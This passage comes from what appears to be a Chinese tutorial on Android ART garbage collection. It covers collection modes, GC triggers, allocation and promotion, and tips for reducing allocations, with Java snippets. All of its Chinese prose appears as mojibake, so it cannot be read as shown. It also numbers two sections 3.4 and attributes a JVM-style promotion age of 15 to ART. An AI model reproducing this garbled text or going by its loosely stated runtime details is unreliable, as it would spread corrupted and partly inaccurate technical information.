<pre><code class="hljs language-ini" lang="ini">ä¼ ç»Ÿå›æ”¶ï¼ˆä¸²è¡Œï¼‰ï¼š
ä¸»çº¿ç¨‹: <span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[æš‚åœGC]</span><span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[æš‚åœGC]</span><span class="hljs-section">[è¿è¡Œ]</span>
         â†“      â†“      â†“      â†“      â†“
        å¡é¡¿   å¡é¡¿   å¡é¡¿   å¡é¡¿   å¡é¡¿

å¹¶å‘å›æ”¶ï¼ˆARTï¼‰ï¼š
ä¸»çº¿ç¨‹: <span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[è¿è¡Œ]</span>
         â†“
        ä¸å¡é¡¿
GCçº¿ç¨‹: <span class="hljs-section">[GC]</span><span class="hljs-section">[GC]</span><span class="hljs-section">[GC]</span>
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”¨æˆ·æ»‘åŠ¨åˆ—è¡¨æ—¶</span>
recyclerView.setOnScrollListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RecyclerView</span>.OnScrollListener() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onScrolled</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-type">int</span> dx, <span class="hljs-type">int</span> dy)</span> {
        <span class="hljs-comment">// å³ä½¿æ­¤æ—¶è§¦å‘GCï¼Œä¹Ÿä¸ä¼šå¡é¡¿</span>
        <span class="hljs-comment">// å› ä¸ºGCåœ¨åå°çº¿ç¨‹æ‰§è¡Œ</span>
    }
});
</code></pre>
<h5 data-id="heading-21">3.3.3 å¤åˆ¶ç®—æ³•ï¼ˆå›æ”¶ç®—æ³•ï¼‰</h5>
<p><strong>å›æ”¶æ—¶ï¼šæŠŠå­˜æ´»çš„å¯¹è±¡å¤åˆ¶åˆ°æ–°ä½ç½®</strong>
<strong>ç„¶åï¼šç›´æ¥æ¸…ç©ºæ—§ä½ç½®</strong></p>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>ç®€å•é«˜æ•ˆ</li>
<li>æ²¡æœ‰å†…å­˜ç¢ç‰‡</li>
</ul>
<p><strong>å·¥ä½œæµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ ‡è®°å­˜æ´»å¯¹è±¡
<span class="hljs-bullet">2.</span> å¤åˆ¶åˆ°æ–°ä½ç½®
<span class="hljs-bullet">3.</span> æ¸…ç©ºæ—§ä½ç½®
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">å›æ”¶å‰ï¼ˆ<span class="hljs-selector-tag">From</span>åŒºï¼‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[å¯¹è±¡4]</span>
 å­˜æ´»   åƒåœ¾   å­˜æ´»   åƒåœ¾

å›æ”¶åï¼ˆ<span class="hljs-selector-tag">To</span>åŒºï¼‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span>
 å­˜æ´»   å­˜æ´»
</code></pre>
<h5 data-id="heading-22">3.3.4 å¢é‡å›æ”¶ï¼ˆä¼˜åŒ–ç‰¹æ€§ï¼‰</h5>
<p><strong>æŠŠå¤§é‡çš„å›æ”¶å·¥ä½œåˆ†æˆå°ä»½</strong>
<strong>åˆ†æ‰¹æ‰§è¡Œï¼Œæ¯æ¬¡åªåšä¸€ç‚¹ç‚¹</strong>
<strong>é¿å…ä¸€æ¬¡æ€§å¡é¡¿å¤ªä¹…</strong></p>
<p><strong>å¢é‡å›æ”¶çš„ä¼˜åŠ¿ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">ä¼ ç»Ÿå›æ”¶ï¼š
<span class="hljs-selector-attr">[ä¸€æ¬¡æ€§å›æ”¶æ‰€æœ‰å¯¹è±¡]</span>
æš‚åœæ—¶é—´ï¼š<span class="hljs-number">50ms</span>
ç”¨æˆ·æ„Ÿè§‰ï¼šæ˜æ˜¾å¡é¡¿

å¢é‡å›æ”¶ï¼š
<span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span><span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span><span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span>
æ¯æ¬¡æš‚åœï¼š<span class="hljs-number">5ms</span>
ç”¨æˆ·æ„Ÿè§‰ï¼šå‡ ä¹æ„Ÿè§‰ä¸åˆ°
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”¨æˆ·æ“ä½œæ—¶ï¼ŒGCä¸ä¼šä¸€æ¬¡æ€§æš‚åœå¤ªä¹…</span>
<span class="hljs-comment">// è€Œæ˜¯åˆ†æˆå¤šæ¬¡ï¼Œæ¯æ¬¡æš‚åœå¾ˆçŸ­æ—¶é—´</span>
button.setOnClickListener(v -&gt; {
    <span class="hljs-comment">// å³ä½¿æ­¤æ—¶GCï¼Œä¹Ÿä¸ä¼šæ˜æ˜¾å¡é¡¿</span>
    <span class="hljs-comment">// å› ä¸ºGCæ˜¯å¢é‡æ‰§è¡Œçš„</span>
});
</code></pre>
<h5 data-id="heading-23">3.3.5 å‹ç¼©å›æ”¶ï¼ˆä¼˜åŒ–ç‰¹æ€§ï¼‰</h5>
<p><strong>å›æ”¶åæ•´ç†å†…å­˜</strong>
<strong>æŠŠåˆ†æ•£çš„å†…å­˜ç¢ç‰‡åˆå¹¶æˆè¿ç»­ç©ºé—´</strong>
<strong>é¿å…å†…å­˜æµªè´¹ï¼Œæ–¹ä¾¿åç»­åˆ†é…</strong></p>
<p><strong>å‹ç¼©å›æ”¶çš„ä¼˜åŠ¿ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">å‹ç¼©å‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span>
å†…å­˜ç¢ç‰‡å¤šï¼Œåˆ†é…æ•ˆç‡ä½

å‹ç¼©åï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
å†…å­˜è¿ç»­ï¼Œåˆ†é…æ•ˆç‡é«˜
</code></pre>
<p><strong>æ€»ç»“ï¼šè¿™äº›éƒ½æ˜¯"å¹¶å‘å¤åˆ¶æ”¶é›†å™¨"çš„ç‰¹æ€§ï¼Œå®ƒä»¬åŒæ—¶å‘æŒ¥ä½œç”¨ï¼Œè®©å›æ”¶æ›´é«˜æ•ˆã€æ›´å°‘å¡é¡¿</strong></p>
<h4 data-id="heading-24">3.4 Android GCçš„è®¾è®¡ç›®æ ‡</h4>
<p><strong>ä½å»¶è¿Ÿ</strong>ï¼šå°½é‡å‡å°‘GCå¯¼è‡´çš„å¡é¡¿
<strong>å¹¶å‘å¤„ç†</strong>ï¼šå°½é‡åœ¨åå°æ‰§è¡Œï¼Œä¸é˜»å¡ä¸»çº¿ç¨‹
<strong>é€‚åˆäº¤äº’å¼åº”ç”¨</strong>ï¼šä¼˜åŒ–ç”¨æˆ·æ»‘åŠ¨ã€ç‚¹å‡»ç­‰æ“ä½œçš„æµç•…åº¦</p>
<h4 data-id="heading-25">3.4 ART GCçš„è§¦å‘æ¡ä»¶ï¼ˆä»€ä¹ˆæ—¶å€™ä¼šè§¦å‘åƒåœ¾å›æ”¶ï¼‰</h4>
<p><strong>è¯´æ˜ï¼šè§¦å‘æ¡ä»¶å°±æ˜¯"ä»€ä¹ˆæƒ…å†µä¸‹ç³»ç»Ÿä¼šè‡ªåŠ¨å¼€å§‹æ¸…ç†åƒåœ¾"</strong></p>
<h4 data-id="heading-26">3.4.1 Partial GCï¼ˆéƒ¨åˆ†å›æ”¶ï¼‰çš„è§¦å‘æ¡ä»¶</h4>
<p><strong>ä»€ä¹ˆæ—¶å€™è§¦å‘ï¼šå¹´è½»ä»£ç©ºé—´æ»¡äº†</strong></p>
<p><strong>å…·ä½“åœºæ™¯ï¼š</strong></p>
<ul>
<li>ä½ åˆ›å»ºäº†å¾ˆå¤šæ–°å¯¹è±¡ï¼Œå¹´è½»ä»£å†…å­˜å¿«ç”¨å®Œäº†</li>
<li>ç³»ç»Ÿæ£€æµ‹åˆ°å¹´è½»ä»£ç©ºé—´ä¸è¶³ï¼Œè‡ªåŠ¨è§¦å‘Partial GC</li>
<li>åªæ¸…ç†å¹´è½»ä»£ï¼Œä¸æ¸…ç†è€å¹´ä»£</li>
</ul>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>è§¦å‘å¿«ï¼Œæ‰§è¡Œå¿«</li>
<li>æš‚åœæ—¶é—´çŸ­ï¼ˆå‡ æ¯«ç§’ï¼‰</li>
<li>å¯¹åº”ç”¨å½±å“å°ï¼Œç”¨æˆ·åŸºæœ¬æ„Ÿè§‰ä¸åˆ°</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createManyObjects</span><span class="hljs-params">()</span> {
    List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());  <span class="hljs-comment">// åˆ›å»ºå¤§é‡å¯¹è±¡</span>
        <span class="hljs-comment">// å½“å¹´è½»ä»£å¿«æ»¡æ—¶ï¼Œè§¦å‘Partial GC</span>
    }
}
</code></pre>
<h4 data-id="heading-27">3.4.2 Full GCï¼ˆå®Œå…¨å›æ”¶ï¼‰çš„è§¦å‘æ¡ä»¶</h4>
<p><strong>ä»€ä¹ˆæ—¶å€™è§¦å‘ï¼šæ•´ä¸ªå †å†…å­˜ä¸è¶³</strong></p>
<p><strong>å…·ä½“åœºæ™¯ï¼š</strong></p>
<ul>
<li>è€å¹´ä»£ç©ºé—´æ»¡äº†</li>
<li>å †å†…å­˜æ•´ä½“ä¸è¶³ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡</li>
<li>æ˜¾å¼è°ƒç”¨System.gc()ï¼ˆAndroidä¸æ¨èï¼Œå› ä¸ºä¼šå¼ºåˆ¶è§¦å‘Full GCï¼‰</li>
</ul>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æ‰§è¡Œæ…¢ï¼Œæš‚åœæ—¶é—´é•¿ï¼ˆå¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰</li>
<li>ä¼šæ¸…ç†æ•´ä¸ªå †ï¼ˆå¹´è½»ä»£+è€å¹´ä»£ï¼‰</li>
<li>å¯èƒ½å¯¼è‡´åº”ç”¨å¡é¡¿ï¼Œç”¨æˆ·èƒ½æ„Ÿè§‰åˆ°</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸æ¨èï¼šä¼šå¼ºåˆ¶è§¦å‘Full GC</span>
System.gc();  <span class="hljs-comment">// Androidä¸æ¨èä½¿ç”¨</span>

<span class="hljs-comment">// åº”è¯¥è®©ç³»ç»Ÿè‡ªåŠ¨ç®¡ç†</span>
<span class="hljs-comment">// é€šè¿‡ä¼˜åŒ–ä»£ç ï¼Œå‡å°‘Full GCçš„è§¦å‘</span>
</code></pre>
<h4 data-id="heading-28">3.4.3 Sticky GCï¼ˆç²˜æ€§å›æ”¶ï¼‰çš„è§¦å‘æ¡ä»¶</h4>
<p><strong>ä»€ä¹ˆæ—¶å€™è§¦å‘ï¼šé¢‘ç¹åˆ›å»ºçŸ­ç”Ÿå‘½å‘¨æœŸå¯¹è±¡æ—¶</strong></p>
<p><strong>å…·ä½“åœºæ™¯ï¼š</strong></p>
<ul>
<li>åˆ—è¡¨å¿«é€Ÿæ»‘åŠ¨æ—¶ï¼ˆRecyclerViewæ»šåŠ¨ï¼‰</li>
<li>åŠ¨ç”»æ’­æ”¾æ—¶ï¼ˆä¸æ–­åˆ›å»ºä¸´æ—¶å¯¹è±¡ï¼‰</li>
<li>UIæ¸²æŸ“æ—¶ï¼ˆé¢‘ç¹åˆ›å»ºViewç›¸å…³å¯¹è±¡ï¼‰</li>
</ul>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>åªæ¸…ç†åˆšåˆšåˆ›å»ºçš„æ–°å¯¹è±¡</li>
<li>éå¸¸å¿«é€Ÿï¼Œå‡ ä¹æ„Ÿè§‰ä¸åˆ°</li>
<li>ä¸“é—¨ä¼˜åŒ–é¢‘ç¹åˆ†é…å¯¹è±¡çš„åœºæ™¯</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">recyclerView.addOnScrollListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RecyclerView</span>.OnScrollListener() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onScrolled</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-type">int</span> dx, <span class="hljs-type">int</span> dy)</span> {
        <span class="hljs-comment">// æ»‘åŠ¨æ—¶é¢‘ç¹åˆ›å»ºå¯¹è±¡</span>
        <span class="hljs-comment">// è§¦å‘Sticky GCï¼Œå¿«é€Ÿæ¸…ç†</span>
    }
});
</code></pre>
<h4 data-id="heading-29">3.4.4 å¦‚ä½•æŸ¥çœ‹å’Œé¢„é˜²GC</h4>
<p><strong>æŸ¥çœ‹GCæ—¥å¿—ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨logcatæŸ¥çœ‹GCäº‹ä»¶</li>
<li>ä½¿ç”¨Android Studio Profilerç›‘æ§GC</li>
<li>ä½¿ç”¨Systraceåˆ†æGCå¯¹æ€§èƒ½çš„å½±å“</li>
</ul>
<p><strong>é¢„é˜²é¢‘ç¹GCï¼š</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ†é…ï¼ˆå¤ç”¨å¯¹è±¡ã€ä½¿ç”¨å¯¹è±¡æ± ï¼‰</li>
<li>åˆç†ä½¿ç”¨ç¼“å­˜ï¼ˆåŠæ—¶æ¸…ç†ä¸éœ€è¦çš„ç¼“å­˜ï¼‰</li>
<li>é¿å…å†…å­˜æ³„æ¼ï¼ˆæ­£ç¡®é‡Šæ”¾èµ„æºï¼‰</li>
</ul>
<h4 data-id="heading-30">3.5 ARTå†…å­˜åˆ†é…ç­–ç•¥ï¼ˆå¯¹è±¡åœ¨å†…å­˜ä¸­æ˜¯æ€ä¹ˆåˆ†é…çš„ï¼‰</h4>
<p><strong>è¯´æ˜ï¼šåˆ†é…ç­–ç•¥å°±æ˜¯"æ–°åˆ›å»ºçš„å¯¹è±¡æ”¾åœ¨å†…å­˜çš„å“ªä¸ªä½ç½®"</strong></p>
<h4 data-id="heading-31">3.5.1 æ–°å¯¹è±¡ä¼˜å…ˆåœ¨å¹´è½»ä»£åˆ†é…</h4>
<p><strong>åˆ†é…è§„åˆ™ï¼šæ–°åˆ›å»ºçš„å¯¹è±¡å…ˆæ”¾åœ¨å¹´è½»ä»£</strong></p>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼š</strong></p>
<ul>
<li>å¤§éƒ¨åˆ†å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆçŸ­ï¼Œå¾ˆå¿«å°±ä¼šè¢«å›æ”¶</li>
<li>æ”¾åœ¨å¹´è½»ä»£ï¼Œå›æ”¶å¿«ï¼Œæ•ˆç‡é«˜</li>
</ul>
<p><strong>å…·ä½“æµç¨‹ï¼š</strong></p>
<ul>
<li>ä½ å†™ä»£ç ï¼š<code>Object obj = new Object()</code></li>
<li>ç³»ç»Ÿåˆ†é…ï¼šå¯¹è±¡æ”¾åœ¨å¹´è½»ä»£</li>
<li>å¦‚æœå¹´è½»ä»£æ»¡äº†ï¼šè§¦å‘Partial GCï¼Œæ¸…ç†åå†åˆ†é…</li>
</ul>
<p><strong>åˆ†é…å¤±è´¥æ€ä¹ˆåŠï¼š</strong></p>
<ul>
<li>å¦‚æœå¹´è½»ä»£æ»¡äº†ï¼Œå…ˆè§¦å‘Partial GC</li>
<li>GCåå¦‚æœè¿˜æ˜¯ä¸å¤Ÿï¼Œå¯èƒ½è§¦å‘Full GC</li>
<li>å¦‚æœFull GCåè¿˜æ˜¯ä¸å¤Ÿï¼Œå¯èƒ½æŠ›å‡ºOutOfMemoryError</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">allocateObjects</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// æ–°å¯¹è±¡åˆ†é…åœ¨å¹´è½»ä»£</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¹´è½»ä»£</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¹´è½»ä»£</span>
    
    <span class="hljs-comment">// å¦‚æœå¹´è½»ä»£æ»¡äº†ï¼Œè§¦å‘Partial GC</span>
    <span class="hljs-comment">// GCåç»§ç»­åˆ†é…</span>
}
</code></pre>
<h4 data-id="heading-32">3.5.2 å¤§å¯¹è±¡çš„å¤„ç†</h4>
<p><strong>ä»€ä¹ˆæ˜¯å¤§å¯¹è±¡ï¼š</strong></p>
<ul>
<li>å ç”¨å†…å­˜å¾ˆå¤§çš„å¯¹è±¡ï¼ˆæ¯”å¦‚å¤§å›¾ç‰‡ã€å¤§æ•°ç»„ï¼‰</li>
<li>Androidåœºæ™¯ï¼šBitmapã€å¤§æ•°ç»„ç­‰</li>
</ul>
<p><strong>å¤§å¯¹è±¡æ€ä¹ˆåˆ†é…ï¼š</strong></p>
<ul>
<li>å¦‚æœå¯¹è±¡å¤ªå¤§ï¼Œå¯èƒ½ç›´æ¥æ”¾åœ¨è€å¹´ä»£</li>
<li>é¿å…åœ¨å¹´è½»ä»£ä¹‹é—´å¤åˆ¶å¤§å¯¹è±¡ï¼ˆå¤åˆ¶æˆæœ¬é«˜ï¼‰</li>
</ul>
<p><strong>å¤§å¯¹è±¡å¯¹GCçš„å½±å“ï¼š</strong></p>
<ul>
<li>å¤§å¯¹è±¡å ç”¨å†…å­˜å¤šï¼Œå®¹æ˜“å¯¼è‡´å†…å­˜ä¸è¶³</li>
<li>å¤§å¯¹è±¡å›æ”¶æ…¢ï¼Œå¯èƒ½å½±å“GCæ€§èƒ½</li>
<li>å»ºè®®ï¼šåŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡ï¼Œé¿å…å†…å­˜å‹åŠ›</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¤§å¯¹è±¡å¯èƒ½ç›´æ¥è¿›å…¥è€å¹´ä»£</span>
<span class="hljs-type">Bitmap</span> <span class="hljs-variable">largeBitmap</span> <span class="hljs-operator">=</span> Bitmap.createBitmap(<span class="hljs-number">4000</span>, <span class="hljs-number">4000</span>, Bitmap.Config.ARGB_8888);
<span class="hljs-comment">// è¿™ä¸ªBitmapå¾ˆå¤§ï¼Œå¯èƒ½ç›´æ¥æ”¾åœ¨è€å¹´ä»£</span>

<span class="hljs-comment">// å»ºè®®ï¼šåŠæ—¶é‡Šæ”¾</span>
largeBitmap.recycle();
largeBitmap = <span class="hljs-literal">null</span>;
</code></pre>
<h4 data-id="heading-33">3.5.3 é•¿æœŸå­˜æ´»çš„å¯¹è±¡æ™‹å‡åˆ°è€å¹´ä»£</h4>
<p><strong>æ™‹å‡è§„åˆ™ï¼šå¯¹è±¡åœ¨å¹´è½»ä»£å­˜æ´»è¶³å¤Ÿä¹…ï¼Œå°±ç§»åˆ°è€å¹´ä»£</strong></p>
<p><strong>å¹´é¾„è®¡æ•°æœºåˆ¶ï¼š</strong></p>
<ul>
<li>æ¯æ¬¡Partial GCåï¼Œå­˜æ´»çš„å¯¹è±¡å¹´é¾„+1</li>
<li>å¹´é¾„è¾¾åˆ°é˜ˆå€¼ï¼ˆæ¯”å¦‚15æ¬¡ï¼‰ï¼Œå°±æ™‹å‡åˆ°è€å¹´ä»£</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦æ™‹å‡ï¼š</strong></p>
<ul>
<li>é•¿æœŸå­˜æ´»çš„å¯¹è±¡æ”¾åœ¨å¹´è½»ä»£ï¼Œæ¯æ¬¡GCéƒ½è¦æ£€æŸ¥ï¼Œæµªè´¹æ•ˆç‡</li>
<li>ç§»åˆ°è€å¹´ä»£ï¼Œå‡å°‘æ£€æŸ¥æ¬¡æ•°ï¼Œæé«˜æ•ˆç‡</li>
</ul>
<p><strong>æ™‹å‡æ—¶æœºï¼š</strong></p>
<ul>
<li>å¯¹è±¡åœ¨å¹´è½»ä»£ç»å†å¤šæ¬¡GCåä»å­˜æ´»</li>
<li>å¹´é¾„è¾¾åˆ°é˜ˆå€¼æ—¶è‡ªåŠ¨æ™‹å‡</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LongLivedObject</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addToCache</span><span class="hljs-params">(Object obj)</span> {
        cache.add(obj);  <span class="hljs-comment">// è¿™ä¸ªå¯¹è±¡è¢«cacheå¼•ç”¨ï¼Œé•¿æœŸå­˜æ´»</span>
        <span class="hljs-comment">// ç»è¿‡å¤šæ¬¡GCåï¼Œä¼šæ™‹å‡åˆ°è€å¹´ä»£</span>
    }
}
</code></pre>
<h4 data-id="heading-34">3.5.4 Androidå†…å­˜é™åˆ¶</h4>
<p><strong>ä¸åŒè®¾å¤‡çš„å †å†…å­˜é™åˆ¶ï¼š</strong></p>
<ul>
<li>ä¸åŒAndroidè®¾å¤‡æœ‰ä¸åŒçš„å †å†…å­˜ä¸Šé™</li>
<li>ä½ç«¯è®¾å¤‡å¯èƒ½åªæœ‰å‡ åMB</li>
<li>é«˜ç«¯è®¾å¤‡å¯èƒ½æœ‰å‡ ç™¾MBåˆ°å‡ GB</li>
</ul>
<p><strong>ä½å†…å­˜è®¾å¤‡çš„å¤„ç†ï¼š</strong></p>
<ul>
<li>ç³»ç»Ÿä¼šé™åˆ¶æ¯ä¸ªåº”ç”¨çš„å†…å­˜ä½¿ç”¨</li>
<li>å†…å­˜ä¸è¶³æ—¶ï¼Œç³»ç»Ÿå¯èƒ½æ€æ­»åå°åº”ç”¨</li>
<li>ä½ çš„åº”ç”¨å¯èƒ½æ”¶åˆ°onLowMemory()å›è°ƒ</li>
</ul>
<p><strong>å†…å­˜ä¼˜åŒ–çš„é‡è¦æ€§ï¼š</strong></p>
<ul>
<li>Androidè®¾å¤‡å†…å­˜æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
<li>å†…å­˜å ç”¨è¿‡é«˜ï¼Œå¯èƒ½å¯¼è‡´åº”ç”¨è¢«ç³»ç»Ÿæ€æ­»</li>
<li>ä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼Œæå‡åº”ç”¨æ€§èƒ½å’Œç¨³å®šæ€§</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLowMemory</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onLowMemory();
        <span class="hljs-comment">// ç³»ç»Ÿå†…å­˜ä¸è¶³æ—¶è°ƒç”¨</span>
        <span class="hljs-comment">// åº”è¯¥é‡Šæ”¾ä¸å¿…è¦çš„èµ„æº</span>
        clearCache();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clearCache</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ¸…ç†ç¼“å­˜ï¼Œé‡Šæ”¾å†…å­˜</span>
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-35">ç¬¬å››éƒ¨åˆ†ï¼šAndroid GCä¼˜åŒ–ä¸å®è·µ</h2>
<h3 data-id="heading-36">4. Android GCä¼˜åŒ–ï¼ˆå¦‚ä½•å‡å°‘GCï¼Œæå‡æ€§èƒ½ï¼‰</h3>
<h4 data-id="heading-37">4.1 Android GCä¼˜åŒ–çš„ç›®æ ‡</h4>
<p><strong>é™ä½GCæš‚åœæ—¶é—´</strong>ï¼šæœ€é‡è¦ï¼Œå‡å°‘å¡é¡¿
<strong>å‡å°‘å†…å­˜å ç”¨</strong>ï¼šé™ä½å†…å­˜å‹åŠ›
<strong>æå‡åº”ç”¨æµç•…åº¦</strong>ï¼šä¼˜åŒ–ç”¨æˆ·ä½“éªŒ
<strong>é¿å…ANR</strong>ï¼šé˜²æ­¢åº”ç”¨æ— å“åº”</p>
<h4 data-id="heading-38">4.2 Androidå¼€å‘ä¸­çš„GCä¼˜åŒ–ç­–ç•¥</h4>
<h5 data-id="heading-39">4.2.1 å‡å°‘å¯¹è±¡åˆ†é…</h5>
<p><strong>å¯¹è±¡å¤ç”¨ï¼ˆä½¿ç”¨å¯¹è±¡æ± ï¼Œé¿å…é¢‘ç¹åˆ›å»ºï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šé¢‘ç¹åˆ›å»ºå¯¹è±¡</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Hello"</span>);  <span class="hljs-comment">// æ¯æ¬¡éƒ½åˆ›å»ºæ–°å¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šå¤ç”¨å¯¹è±¡</span>
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-comment">// å¤ç”¨åŒä¸€ä¸ªå¯¹è±¡</span>
}
</code></pre>
<p><strong>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»ºï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå­—ç¬¦ä¸²æ‹¼æ¥</span>
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    result += i;  <span class="hljs-comment">// æ¯æ¬¡éƒ½åˆ›å»ºæ–°Stringå¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨StringBuilder</span>
<span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    sb.append(i);  <span class="hljs-comment">// å¤ç”¨StringBuilder</span>
}
